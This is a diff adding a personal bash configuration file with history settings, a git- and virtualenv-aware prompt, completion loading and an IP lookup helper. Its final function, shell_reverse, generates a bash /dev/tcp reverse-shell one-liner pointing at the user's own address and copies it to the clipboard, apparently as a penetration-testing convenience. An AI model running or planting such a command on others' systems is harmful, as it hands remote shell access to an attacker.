@@ -1,0 +1,64 @@
+# If not running interactively, don't do anything
+[[ $- != *i* ]] && return
+
+# don't put duplicate lines or lines starting with space in the history
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+if [ -f ~/.bash_aliases ]; then
+	. ~/.bash_aliases
+fi
+
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+git_branch() {
+    git branch 2> /dev/null | sed '/^[^*]/d' | sed 's/* \(.*\)/\1 /'
+}
+
+virtual_env() {
+    if [[ -n $VIRTUAL_ENV ]]
+    then
+        echo -e "\033[01;33m${VIRTUAL_ENV##*/}\033[00m "
+    fi
+}
+export VIRTUAL_ENV_DISABLE_PROMPT=1
+
+PS1='$(virtual_env)\[\033[01;34m\]\W\[\033[00m\] \[\033[01;31m\]$(git_branch)\[\033[00m\]\[\033[01;37m\]\$\[\033[00m\] '
+
+# Enable completion features
+if ! shopt -oq posix; then
+	if [ -f /usr/share/bash-completion/bash_compleltion ]; then
+		. /usr/share/bash-completion/bash_completion
+	elif [ -f /etc/bash_completion ]; then
+		. /etc/bash_completion
+	fi
+fi
+
+get_ip() {
+    if [[ -n $1 ]]
+    then
+        DEV=$1
+    else
+        DEV=wlp1s0
+    fi
+
+    echo $(ip a show dev $DEV | grep inet | cut -d '/' -f 1 | cut -d ' ' -f 6)
+}
+
+shell_reverse() {
+    if [[ -z $1 ]]
+    then
+        PORT=1337
+    else
+        PORT=$1
+    fi
+
+    IP=$(get_ip $2)
+    REVERSE="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+
+    echo $REVERSE | xsel -b
+    echo $REVERSE
+}
